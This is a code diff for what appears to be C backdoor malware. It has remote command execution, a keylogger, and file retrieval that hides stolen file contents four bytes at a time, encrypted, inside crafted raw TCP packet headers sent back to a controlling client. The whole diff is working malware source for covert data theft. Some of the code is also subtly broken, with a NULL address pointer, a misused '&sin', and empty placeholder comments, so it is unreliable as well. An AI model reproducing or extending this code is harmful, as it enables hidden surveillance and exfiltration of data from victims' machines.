@@ -1,6 +1,6 @@
 #include "functionality.h"
 
-int processFile(char *filePath, int socket);
+static void processFile(char *filePath, int socket, char *buffer, struct sockaddr_in *sin);
 static void whoAmI(char *buffer);
 static int createRawTcpSocket();
 static char *createRawTcpPacket(struct sockaddr_in *sin);
@@ -45,9 +45,6 @@ void executeSystemCall(char *command)
     // Create the packet structure
     buffer = createRawTcpPacket(sin);
     
-    // Create the raw socket
-    socket = createRawTcpSocket();
-    
     // Read from the stream
     while ((bytesRead = fread(line, sizeof(char), 4, results)) > 0)
     {
@@ -63,6 +60,8 @@ void executeSystemCall(char *command)
                (struct sockaddr *)&sin, sizeof(sin));
     }
     
+    // Send a FIN packet to signal end of transfer
+    
     pclose(results);
     close(socket);
     free(buffer);
@@ -72,6 +71,9 @@ void retrieveFile(char *fileName)
 {
     int socket = 0;
     char line[PATH_MAX];
+    char *buffer = NULL;
+    struct sockaddr_in *sin = NULL;
+    
     FILE *results = NULL;
     
     // Update the database for locate
@@ -90,21 +92,29 @@ void retrieveFile(char *fileName)
     }
     
     // Open a connection back to the client
-
+    if ((socket = createRawTcpSocket()) == 0)
+    {
+        return;
+    }
     
     // Make sure we do not receive any data
     shutdown(socket, SHUT_RD);
+    
+    // Create the packet structure
+    buffer = createRawTcpPacket(sin);
     
     // This will handle multiple results from locate, client may break depending
     // on the type of file requested.
     while (fgets(line, PATH_MAX, results) != NULL)
     {
-        processFile(line, socket);
+        processFile(line, socket, buffer, sin);
     }
+    
+    // Send a FIN packet to signal end of transfer
     
     pclose(results);
     close(socket);
-    
+    free(buffer);
 }
 
 void keylogger()
@@ -122,27 +132,43 @@ void keylogger()
 #endif
 }
 
-int processFile(char *filePath, int socket)
+static void processFile(char *filePath, int socket, char *buffer, struct sockaddr_in *sin)
 {
-    char line[PATH_MAX];
+    int bytesRead = 0;
+    char line[4];
+    char date[11];
+    char *encryptedField = NULL;
+    struct tm *timeStruct = NULL;
+    unsigned short sum = 0;
+    time_t t;
     FILE *file = NULL;
     
     // Open the file for reading
     file = fopen(filePath, "r");
     if (file == NULL)
     {
-        return -1;
+        systemFatal("Could not find and open file");
     }
     
+    // Get the time structs ready
+    time(&t);
+    timeStruct = localtime(&t);
+    strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
+    
     // Read and send the file
-    while (fgets(line, PATH_MAX, file) != NULL)
-    {/*
-        if (sendBuffer(socket, line, strnlen(line, PATH_MAX)) == -1)
-        {
-            return -1;
-        }*/
+    while ((bytesRead = fread(line, sizeof(char), 4, file)) > 0)
+    {
+        // Copy the line and encrypt it
+        encryptedField = encrypt_data(line, date, bytesRead);
+        memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
+        
+        // Get the checksum for the IP packet
+        sum = csum((unsigned short *)buffer, 5);
+        memcpy(buffer + sizeof(struct ip) + 16, &sum, sizeof(unsigned short));
+        
+        sendto(socket, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0,
+               (struct sockaddr *)&sin, sizeof(sin));
     }
-    return 0;
 }
 
 char *createRawTcpPacket(struct sockaddr_in *sin)
